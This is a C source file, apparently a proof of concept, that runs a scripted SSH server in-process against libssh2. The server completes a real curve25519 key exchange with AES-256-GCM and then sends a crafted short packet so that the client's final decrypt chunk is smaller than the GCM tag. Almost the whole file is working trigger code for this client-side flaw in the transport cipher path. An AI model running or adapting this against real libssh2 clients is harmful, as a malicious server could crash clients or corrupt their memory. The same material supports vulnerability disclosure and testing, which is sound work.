/*
 * residual.c
 *
 * Drives libssh2's public API against an in-process scripted SSH "server"
 * to exercise the AES-GCM decrypt path in the transport cipher.
 *
 * The scripted server speaks enough SSH-2.0 to complete:
 *   banner -> KEXINIT -> curve25519-sha256 kex (ssh-ed25519 hostkey)
 *   -> NEWKEYS (aes256-gcm@openssh.com negotiated) -> SERVICE_ACCEPT
 *   -> USERAUTH_FAILURE -> USERAUTH_SUCCESS -> CHANNEL_OPEN_CONFIRMATION
 *
 * ...and then sends one more packet whose length field leaves the client
 * with a final decrypt chunk shorter than the GCM tag it must hold.
 *
 * Public libssh2 API only: libssh2_init(), libssh2_session_init(),
 * libssh2_session_callback_set2(), libssh2_session_handshake(),
 * libssh2_userauth_list(), libssh2_userauth_password(),
 * libssh2_channel_open(), libssh2_channel_read().
 */

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>

#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>

#include <libssh2.h>

/* ------------------------------------------------------------------ */
/* scripted server state                                              */
/* ------------------------------------------------------------------ */

#define SRV_CAP 262144

static unsigned char srv_out[SRV_CAP];   /* server -> client stream */
static size_t srv_out_len;
static size_t srv_out_pos;

static unsigned char cli_out[SRV_CAP];   /* client -> server stream */
static size_t cli_out_len;

static size_t cli_parse;                 /* parse cursor into cli_out */
static int got_banner;                   /* client banner seen */
static int got_kexinit;                  /* client KEXINIT seen */
static int built_kex;                    /* kex reply queued */

static unsigned char cli_banner[256];
static size_t cli_banner_len;
static unsigned char cli_kexinit[4096];
static size_t cli_kexinit_len;
static unsigned char cli_e[32];          /* client X25519 public key */

static void srv_put(const void *p, size_t n)
{
    if(srv_out_len + n > SRV_CAP)
        abort();
    memcpy(srv_out + srv_out_len, p, n);
    srv_out_len += n;
}

static void srv_put_byte(unsigned char b)
{
    srv_put(&b, 1);
}

static void srv_put_u32(uint32_t v)
{
    unsigned char b[4] = { (unsigned char)(v >> 24), (unsigned char)(v >> 16),
                           (unsigned char)(v >> 8),  (unsigned char)v };
    srv_put(b, 4);
}

static void srv_put_str(const void *p, uint32_t n)
{
    srv_put_u32(n);
    if(n)
        srv_put(p, n);
}

static void srv_put_cstr(const char *s)
{
    srv_put_str(s, (uint32_t)strlen(s));
}

/* ------------------------------------------------------------------ */
/* small helpers                                                      */
/* ------------------------------------------------------------------ */

static void buf_u32(unsigned char **p, uint32_t v)
{
    *(*p)++ = (unsigned char)(v >> 24);
    *(*p)++ = (unsigned char)(v >> 16);
    *(*p)++ = (unsigned char)(v >> 8);
    *(*p)++ = (unsigned char)v;
}

static void buf_str(unsigned char **p, const void *d, uint32_t n)
{
    buf_u32(p, n);
    if(n) {
        memcpy(*p, d, n);
        *p += n;
    }
}

static void buf_cstr(unsigned char **p, const char *s)
{
    buf_str(p, s, (uint32_t)strlen(s));
}

static void sha_add_u32(SHA256_CTX *c, uint32_t v)
{
    unsigned char b[4] = { (unsigned char)(v >> 24), (unsigned char)(v >> 16),
                           (unsigned char)(v >> 8),  (unsigned char)v };
    SHA256_Update(c, b, 4);
}

/* ------------------------------------------------------------------ */
/* server host key and kex material                                   */
/* ------------------------------------------------------------------ */

static unsigned char ed_seed[32];        /* Ed25519 host key seed */
static unsigned char ed_pub[32];         /* Ed25519 public key    */
static unsigned char x25519_seed[32];    /* kex private key       */
static unsigned char x25519_pub[32];     /* kex public key (f)    */

static void server_keys_init(void)
{
    EVP_PKEY *k;
    size_t len;

    RAND_bytes(ed_seed, sizeof(ed_seed));
    RAND_bytes(x25519_seed, sizeof(x25519_seed));

    k = EVP_PKEY_new_raw_private_key(EVP_PKEY_ED25519, NULL,
                                      ed_seed, sizeof(ed_seed));
    len = sizeof(ed_pub);
    if(!k || EVP_PKEY_get_raw_public_key(k, ed_pub, &len) != 1 ||
       len != sizeof(ed_pub))
        abort();
    EVP_PKEY_free(k);

    k = EVP_PKEY_new_raw_private_key(EVP_PKEY_X25519, NULL,
                                      x25519_seed, sizeof(x25519_seed));
    len = sizeof(x25519_pub);
    if(!k || EVP_PKEY_get_raw_public_key(k, x25519_pub, &len) != 1 ||
       len != sizeof(x25519_pub))
        abort();
    EVP_PKEY_free(k);
}

static void ed25519_sign(const unsigned char *m, size_t mlen,
                         unsigned char sig[64])
{
    EVP_PKEY *k = EVP_PKEY_new_raw_private_key(EVP_PKEY_ED25519, NULL,
                                               ed_seed, sizeof(ed_seed));
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();
    size_t siglen = 64;

    if(!k || !ctx ||
       EVP_DigestSignInit(ctx, NULL, NULL, NULL, k) != 1 ||
       EVP_DigestSign(ctx, sig, &siglen, m, mlen) != 1 ||
       siglen != 64)
        abort();

    EVP_MD_CTX_free(ctx);
    EVP_PKEY_free(k);
}

/* shared secret K as an SSH mpint, computed the way the client side does
   it (bignum taken over the raw 32 X25519 output bytes) */
static size_t k_mpint(const unsigned char shared[32], unsigned char *out)
{
    const unsigned char *be = shared;
    unsigned char *o = out;
    size_t len = 32;

    while(len > 0 && be[0] == 0) {
        be++;
        len--;
    }
    if(len == 0) {
        buf_u32(&o, 1);
        *o++ = 0;
    }
    else if(be[0] & 0x80) {
        buf_u32(&o, (uint32_t)(len + 1));
        *o++ = 0;
        memcpy(o, be, len);
        o += len;
    }
    else {
        buf_u32(&o, (uint32_t)len);
        memcpy(o, be, len);
        o += len;
    }
    return (size_t)(o - out);
}

/* ------------------------------------------------------------------ */
/* scripted server: plaintext exchange                                */
/* ------------------------------------------------------------------ */

static const char server_banner[] = "SSH-2.0-PoCserver_1.0";

static unsigned char my_kexinit[512];
static size_t my_kexinit_len;

static void queue_plain_packet(const unsigned char *payload, size_t len)
{
    size_t pad = 8 - ((5 + len) % 8);

    if(pad < 4)
        pad += 8;
    srv_put_u32((uint32_t)(1 + len + pad));
    srv_put_byte((unsigned char)pad);
    srv_put(payload, len);
    while(pad--)
        srv_put_byte(0);
}

static void build_my_kexinit(void)
{
    unsigned char cookie[16];
    unsigned char *p = my_kexinit;

    RAND_bytes(cookie, sizeof(cookie));

    *p++ = 20;                              /* SSH_MSG_KEXINIT */
    memcpy(p, cookie, 16);
    p += 16;
    buf_cstr(&p, "curve25519-sha256");      /* kex algorithms */
    buf_cstr(&p, "ssh-ed25519");            /* server host key algorithms */
    buf_cstr(&p, "aes256-gcm@openssh.com"); /* encryption c2s */
    buf_cstr(&p, "aes256-gcm@openssh.com"); /* encryption s2c */
    buf_cstr(&p, "hmac-sha2-256");          /* mac c2s */
    buf_cstr(&p, "hmac-sha2-256");          /* mac s2c */
    buf_cstr(&p, "none");                   /* compression c2s */
    buf_cstr(&p, "none");                   /* compression s2c */
    buf_cstr(&p, "");                       /* languages c2s */
    buf_cstr(&p, "");                       /* languages s2c */
    *p++ = 0;                               /* first_kex_packet_follows */
    buf_u32(&p, 0);                         /* reserved */

    my_kexinit_len = (size_t)(p - my_kexinit);
}

/* ------------------------------------------------------------------ */
/* scripted server: kex completion and encrypted traffic              */
/* ------------------------------------------------------------------ */

static EVP_CIPHER_CTX *s2c_gcm;

static void gcm_seal_packet(const unsigned char *pt, size_t plen,
                            uint32_t wire_len)
{
    unsigned char ct[512];
    unsigned char tag[16];
    unsigned char lastiv[16];
    unsigned char aad[4];
    int outl = 0;

    aad[0] = (unsigned char)(wire_len >> 24);
    aad[1] = (unsigned char)(wire_len >> 16);
    aad[2] = (unsigned char)(wire_len >> 8);
    aad[3] = (unsigned char)wire_len;

    EVP_CIPHER_CTX_ctrl(s2c_gcm, EVP_CTRL_GCM_IV_GEN, 1, lastiv);
    EVP_EncryptUpdate(s2c_gcm, NULL, &outl, aad, 4);
    EVP_EncryptUpdate(s2c_gcm, ct, &outl, pt, (int)plen);
    EVP_EncryptFinal_ex(s2c_gcm, ct + plen, &outl);
    EVP_CIPHER_CTX_ctrl(s2c_gcm, EVP_CTRL_GCM_GET_TAG, 16, tag);

    srv_put_u32(wire_len);
    srv_put(ct, plen);
    srv_put(tag, 16);
}

static void queue_enc_packet(const unsigned char *payload, size_t len)
{
    unsigned char pt[512];
    size_t plen = 16 * ((len + 1 + 4 + 15) / 16);   /* padlen + >=4 padding */
    size_t pad = plen - len - 1;

    pt[0] = (unsigned char)pad;
    memcpy(pt + 1, payload, len);
    memset(pt + 1 + len, 0x44, pad);

    gcm_seal_packet(pt, plen, (uint32_t)plen);
}

/* A short final packet: the length field announces 8 bytes of ciphertext,
   so after the first block the client has 12 bytes of stream left for the
   final decrypt chunk -- four fewer than the tag it must contain. */
static void queue_short_packet(void)
{
    unsigned char pt[8];

    pt[0] = 4;                              /* padding_length */
    pt[1] = 94;                             /* SSH_MSG_CHANNEL_DATA */
    pt[2] = 0;                              /* recipient channel 0 */
    pt[3] = 0;
    pt[4] = 0;
    pt[5] = 0;
    pt[6] = 0;
    pt[7] = 0;

    gcm_seal_packet(pt, 8, 8);
}

static void build_kex(void)
{
    unsigned char pkt[512];
    unsigned char hostkey[128];
    unsigned char sigbuf[128];
    size_t sigbuf_len;
    unsigned char sig[64];
    unsigned char shared[32];
    unsigned char kvalue[40];
    size_t kvalue_len;
    unsigned char H[32];
    unsigned char iv[12], key[32];
    unsigned char *p;
    size_t hostkey_len;
    SHA256_CTX sc;

    /* --- X25519 shared secret --- */
    {
        EVP_PKEY *mine = EVP_PKEY_new_raw_private_key(EVP_PKEY_X25519, NULL,
                                                      x25519_seed, 32);
        EVP_PKEY *peer = EVP_PKEY_new_raw_public_key(EVP_PKEY_X25519, NULL,
                                                     cli_e, 32);
        EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(mine, NULL);
        size_t outlen = sizeof(shared);

        if(!mine || !peer || !ctx ||
           EVP_PKEY_derive_init(ctx) != 1 ||
           EVP_PKEY_derive_set_peer(ctx, peer) != 1 ||
           EVP_PKEY_derive(ctx, shared, &outlen) != 1 ||
           outlen != 32)
            abort();
        EVP_PKEY_CTX_free(ctx);
        EVP_PKEY_free(mine);
        EVP_PKEY_free(peer);
    }

    kvalue_len = k_mpint(shared, kvalue);

    /* --- host key blob --- */
    p = hostkey;
    buf_cstr(&p, "ssh-ed25519");
    buf_str(&p, ed_pub, 32);
    hostkey_len = (size_t)(p - hostkey);

    /* --- exchange hash: V_C, V_S, I_C, I_S, K_S, e, f, K --- */
    SHA256_Init(&sc);
    sha_add_u32(&sc, (uint32_t)cli_banner_len);
    SHA256_Update(&sc, cli_banner, cli_banner_len);
    sha_add_u32(&sc, (uint32_t)(sizeof(server_banner) - 1));
    SHA256_Update(&sc, server_banner, sizeof(server_banner) - 1);
    sha_add_u32(&sc, (uint32_t)cli_kexinit_len);
    SHA256_Update(&sc, cli_kexinit, cli_kexinit_len);
    sha_add_u32(&sc, (uint32_t)my_kexinit_len);
    SHA256_Update(&sc, my_kexinit, my_kexinit_len);
    sha_add_u32(&sc, (uint32_t)hostkey_len);
    SHA256_Update(&sc, hostkey, hostkey_len);
    sha_add_u32(&sc, 32);
    SHA256_Update(&sc, cli_e, 32);
    sha_add_u32(&sc, 32);
    SHA256_Update(&sc, x25519_pub, 32);
    SHA256_Update(&sc, kvalue, kvalue_len);
    SHA256_Final(H, &sc);

    ed25519_sign(H, 32, sig);
    p = sigbuf;
    buf_cstr(&p, "ssh-ed25519");
    buf_str(&p, sig, 64);
    sigbuf_len = (size_t)(p - sigbuf);

    /* --- SSH_MSG_KEX_ECDH_REPLY --- */
    p = pkt;
    *p++ = 31;
    buf_str(&p, hostkey, (uint32_t)hostkey_len);
    buf_str(&p, x25519_pub, 32);
    buf_str(&p, sigbuf, (uint32_t)sigbuf_len);
    queue_plain_packet(pkt, (size_t)(p - pkt));

    /* --- SSH_MSG_NEWKEYS --- */
    {
        unsigned char nk = 21;
        queue_plain_packet(&nk, 1);
    }

    /* --- derive s2c IV/key: HASH(K || H || "B"/"D" || session_id) --- */
    {
        SHA256_CTX k;
        unsigned char ch;
        unsigned char dg[32];

        ch = 'B';
        SHA256_Init(&k);
        SHA256_Update(&k, kvalue, kvalue_len);
        SHA256_Update(&k, H, 32);
        SHA256_Update(&k, &ch, 1);
        SHA256_Update(&k, H, 32);
        SHA256_Final(dg, &k);
        memcpy(iv, dg, 12);

        ch = 'D';
        SHA256_Init(&k);
        SHA256_Update(&k, kvalue, kvalue_len);
        SHA256_Update(&k, H, 32);
        SHA256_Update(&k, &ch, 1);
        SHA256_Update(&k, H, 32);
        SHA256_Final(dg, &k);
        memcpy(key, dg, 32);
    }

    s2c_gcm = EVP_CIPHER_CTX_new();
    if(EVP_CipherInit(s2c_gcm, EVP_aes_256_gcm(), key, iv, 1) != 1 ||
       EVP_CIPHER_CTX_ctrl(s2c_gcm, EVP_CTRL_AEAD_SET_IV_FIXED, -1, iv) != 1)
        abort();

    /* --- encrypted scripted session --- */
    {
        unsigned char msg[256];
        unsigned char *q;

        q = msg;                            /* SSH_MSG_SERVICE_ACCEPT */
        *q++ = 6;
        buf_cstr(&q, "ssh-userauth");
        queue_enc_packet(msg, (size_t)(q - msg));

        q = msg;                            /* SSH_MSG_USERAUTH_FAILURE */
        *q++ = 51;
        buf_cstr(&q, "password");
        *q++ = 0;
        queue_enc_packet(msg, (size_t)(q - msg));

        q = msg;                            /* SSH_MSG_USERAUTH_SUCCESS */
        *q++ = 52;
        queue_enc_packet(msg, (size_t)(q - msg));

        q = msg;                            /* SSH_MSG_CHANNEL_OPEN_... */
        *q++ = 91;                          /* ...CONFIRMATION */
        buf_u32(&q, 0);                     /* recipient channel 0 */
        buf_u32(&q, 0x53534200u);           /* sender channel */
        buf_u32(&q, 0x200000);              /* initial window */
        buf_u32(&q, 0x8000);                /* maximum packet size */
        queue_enc_packet(msg, (size_t)(q - msg));

        queue_short_packet();
    }
}

/* ------------------------------------------------------------------ */
/* client stream parsing (from the send callback)                     */
/* ------------------------------------------------------------------ */

static void parse_client(void)
{
    for(;;) {
        if(!got_banner) {
            unsigned char *nl = memchr(cli_out + cli_parse, '\n',
                                       cli_out_len - cli_parse);
            size_t linelen;

            if(!nl)
                return;
            linelen = (size_t)(nl - (cli_out + cli_parse));
            if(linelen && cli_out[cli_parse + linelen - 1] == '\r')
                linelen--;
            if(linelen >= sizeof(cli_banner))
                linelen = sizeof(cli_banner) - 1;
            memcpy(cli_banner, cli_out + cli_parse, linelen);
            cli_banner_len = linelen;
            cli_parse += (size_t)(nl - (cli_out + cli_parse)) + 1;
            got_banner = 1;
            continue;
        }

        if(!built_kex) {
            uint32_t plen, padlen, paylen;
            unsigned char *pay;

            if(cli_out_len - cli_parse < 5)
                return;
            plen = ((uint32_t)cli_out[cli_parse] << 24) |
                   ((uint32_t)cli_out[cli_parse + 1] << 16) |
                   ((uint32_t)cli_out[cli_parse + 2] << 8) |
                   (uint32_t)cli_out[cli_parse + 3];
            if(plen < 2 || (size_t)plen > cli_out_len - cli_parse - 4)
                return;
            padlen = cli_out[cli_parse + 4];
            if(padlen + 1 > plen)
                return;
            paylen = plen - padlen - 1;
            pay = cli_out + cli_parse + 5;

            if(!got_kexinit && pay[0] == 20 && paylen <= sizeof(cli_kexinit)) {
                memcpy(cli_kexinit, pay, paylen);
                cli_kexinit_len = paylen;
                got_kexinit = 1;
            }
            else if(got_kexinit && pay[0] == 30 && paylen == 37 &&
                    pay[1] == 0 && pay[2] == 0 && pay[3] == 0 && pay[4] == 32) {
                memcpy(cli_e, pay + 5, 32);
                build_kex();
                built_kex = 1;
            }
            else if(pay[0] == 21) {
                /* client NEWKEYS; the rest of the client stream is
                   encrypted and not needed */
                cli_parse = cli_out_len;
                return;
            }

            cli_parse += 4 + plen;
            continue;
        }

        return;
    }
}

/* ------------------------------------------------------------------ */
/* libssh2 I/O callbacks                                              */
/* ------------------------------------------------------------------ */

static ssize_t poc_recv(libssh2_socket_t sock, void *buffer, size_t length,
                        int flags, void **abstract)
{
    size_t avail;

    (void)sock;
    (void)flags;
    (void)abstract;

    avail = srv_out_len - srv_out_pos;
    if(avail == 0)
        return 0;                       /* scripted server is done */
    if(length < avail)
        avail = length;
    memcpy(buffer, srv_out + srv_out_pos, avail);
    srv_out_pos += avail;
    return (ssize_t)avail;
}

static ssize_t poc_send(libssh2_socket_t sock, const void *buffer,
                        size_t length, int flags, void **abstract)
{
    (void)sock;
    (void)flags;
    (void)abstract;

    if(cli_out_len + length > sizeof(cli_out))
        return -EIO;
    memcpy(cli_out + cli_out_len, buffer, length);
    cli_out_len += length;
    parse_client();
    return (ssize_t)length;
}

/* ------------------------------------------------------------------ */
/* driver                                                             */
/* ------------------------------------------------------------------ */

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_CHANNEL *channel = NULL;
    int fds[2];
    char buf[512];
    ssize_t n;

    setvbuf(stdout, NULL, _IONBF, 0);

    if(libssh2_init(0))
        return 0;

    server_keys_init();
    build_my_kexinit();

    srv_put(server_banner, sizeof(server_banner) - 1);
    srv_put("\r\n", 2);
    queue_plain_packet(my_kexinit, my_kexinit_len);

    if(socketpair(AF_UNIX, SOCK_STREAM, 0, fds))
        return 0;

    session = libssh2_session_init();
    if(!session)
        return 0;

    libssh2_session_callback_set2(session, LIBSSH2_CALLBACK_SEND,
                                  (libssh2_cb_generic *)poc_send);
    libssh2_session_callback_set2(session, LIBSSH2_CALLBACK_RECV,
                                  (libssh2_cb_generic *)poc_recv);
    libssh2_session_set_blocking(session, 1);

    printf("handshake...\n");
    if(libssh2_session_handshake(session, fds[0])) {
        printf("handshake failed (%d)\n",
               libssh2_session_last_errno(session));
        goto out;
    }
    printf("handshake ok; listing auth methods...\n");

    libssh2_userauth_list(session, "poc", 3);

    if(libssh2_userauth_password(session, "poc", "poc")) {
        printf("password auth failed (%d)\n",
               libssh2_session_last_errno(session));
        goto out;
    }
    printf("authenticated; opening session channel...\n");

    channel = libssh2_channel_open_session(session);
    if(!channel) {
        printf("channel open failed (%d)\n",
               libssh2_session_last_errno(session));
        goto out;
    }
    printf("channel open; reading...\n");

    n = libssh2_channel_read(channel, buf, sizeof(buf));
    printf("channel read: %zd\n", n);

out:
    if(channel)
        libssh2_channel_free(channel);
    libssh2_session_free(session);
    libssh2_exit();
    close(fds[0]);
    close(fds[1]);
    return 0;
}
